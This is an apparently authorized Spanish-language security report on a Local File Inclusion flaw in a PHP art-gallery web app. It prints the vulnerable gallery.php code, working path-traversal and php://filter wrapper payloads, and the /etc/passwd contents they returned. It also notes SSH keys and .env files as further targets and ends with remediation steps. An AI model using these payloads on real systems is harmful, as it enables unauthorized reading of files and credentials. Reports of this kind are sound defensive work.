# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:49:00  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Estado:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante la manipulación del parámetro `page` en el endpoint `gallery.php`.

**Severidad:** 🔴 CRÍTICA  
**CVSS Score estimado:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## 2. Descripción Técnica

### 2.1 Endpoint vulnerable

```
http://web.dev.local:8081/gallery.php?page=<PAYLOAD>
```

### 2.2 Código fuente vulnerable

Mediante explotación de la propia LFI con PHP wrappers, se obtuvo el código fuente del archivo `gallery.php`:

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
<!-- ... -->
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Causa raíz:** El parámetro `page` de la petición GET se utiliza directamente para incluir ficheros mediante `include()` sin ninguna validación de ruta ni restricción de directorio. Cuando el valor contiene un `.`, se usa directamente como ruta de fichero, lo que permite el traversal con `../`.

### 2.3 Vectores de ataque identificados

| Vector | Payload | Resultado |
|--------|---------|-----------|
| Path traversal básico | `../../../etc/passwd` | ✅ Exitoso |
| PHP filter wrapper | `php://filter/convert.base64-encode/resource=gallery.php` | ✅ Exitoso |
| Null byte (`%00`) | `../../../etc/passwd%00` | ❌ No funcional (PHP moderno) |
| Double encoding | `....//....//etc/passwd` | ❌ No funcional |

---

## 3. Explotación

### 3.1 Lectura de /etc/passwd

**Payload:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Lectura de código fuente PHP via PHP Wrappers

**Payload:** `http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php`

La aplicación no filtra los PHP wrappers, permitiendo leer el código fuente en base64 y posteriormente decodificarlo.

### 3.3 Información del sistema

- **Host interno:** `172.19.0.2 d5054e367753` (obtenido de `/etc/hosts`)
- **Entorno:** Contenedor Docker (hostname `d5054e367753`)
- **Servidor:** PHP con Apache/nginx en Linux Debian/Ubuntu

---

## 4. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Confidencialidad** | Alto - Lectura de archivos arbitrarios del sistema |
| **Integridad** | Bajo - Solo lectura (sin RCE confirmado) |
| **Disponibilidad** | Bajo - No afecta disponibilidad directamente |

**Riesgos derivados:**
- Exposición de credenciales en archivos de configuración (`.env`, `config.php`, etc.)
- Lectura de claves SSH (`/root/.ssh/id_rsa`)
- Exfiltración de código fuente de la aplicación
- Posible escalada a RCE mediante Log Poisoning si los logs son accesibles

---

## 5. Recomendaciones

1. **Validación estricta del parámetro `page`:** Usar una lista blanca (whitelist) de páginas permitidas.

```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';
if (!in_array($page, $allowed_pages)) {
    $page = 'modern';
}
include("pages/" . $page . ".php");
```

2. **Nunca usar input del usuario directamente en `include()`** sin sanitización.

3. **Deshabilitar PHP wrappers peligrosos** en `php.ini`:
   ```ini
   allow_url_include = Off
   ```

4. **Implementar `open_basedir`** en PHP para restringir el acceso al sistema de ficheros:
   ```ini
   open_basedir = /var/www/html
   ```

5. **Principio de mínimo privilegio:** El proceso PHP no debe ejecutarse como root ni tener acceso a directorios sensibles.

---

## 6. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de LFI en el parámetro `page` del archivo `gallery.php`. La explotación es trivial y no requiere autenticación. Se pudo leer exitosamente el fichero `/etc/passwd` y el código fuente de la propia aplicación. Se recomienda corregir inmediatamente aplicando las medidas descritas en la sección de recomendaciones.

---

*Informe generado por análisis de seguridad autorizado - 2026-04-30*
